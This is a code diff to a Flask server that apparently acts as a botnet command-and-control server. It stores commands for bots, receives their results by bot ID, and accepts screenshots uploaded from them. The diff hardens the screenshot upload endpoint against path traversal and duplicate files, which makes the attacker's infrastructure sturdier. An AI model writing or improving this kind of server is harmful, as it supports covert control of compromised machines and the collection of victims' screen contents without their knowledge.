@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
-
+from werkzeug.utils import secure_filename
+import os
 app = Flask(__name__)
 
 # Dictionary to store commands for bots
@@ -42,12 +43,24 @@ def receive_result(bot_id):
 
 @app.route('/upload_screenshot', methods=['POST'])
 def upload_screenshot():
-    file = request.files['file']
-    if file:
-        save_path = f"./screenshots/{file.filename}"
-        file.save(save_path)
-        return "Screenshot saved", 200
-    return "No file uploaded", 400
+    file = request.files.get('file')
+    if not file:
+        return "No file uploaded", 400
+    
+    filename = secure_filename(file.filename)
+    if not filename:
+        return "Invalid file name", 400
+
+    save_dir = "./screenshots"
+    os.makedirs(save_dir, exist_ok=True)  # Ensure directory exists
+    save_path = os.path.join(save_dir, filename)
+    
+    # Check for duplicates
+    if os.path.exists(save_path):
+        return "File already exists", 409
+
+    file.save(save_path)
+    return "Screenshot saved", 200
 
 @app.route('/')
 def home():
